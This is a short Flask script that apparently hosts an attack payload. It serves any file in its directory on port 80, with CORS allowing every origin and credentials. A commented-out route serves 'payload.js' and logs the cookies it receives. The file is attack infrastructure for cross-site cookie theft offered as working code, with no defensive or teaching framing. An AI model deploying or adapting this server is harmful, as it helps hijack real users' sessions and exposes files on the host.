from flask import Flask, send_from_directory,request
from flask_cors import CORS

app = Flask(__name__)
CORS(app,origins="*",supports_credentials=True)

'''@app.route('/payload.js')
def serve_payload():
    cookies = request.cookies
    print(f"Received cookies: {cookies}")
    return send_from_directory('.', 'payload.js)'''

@app.route('/<path:filename>')
def serve_file(filename):
    return send_from_directory('.', filename)

if __name__ == '__main__':
    app.run(port=80)

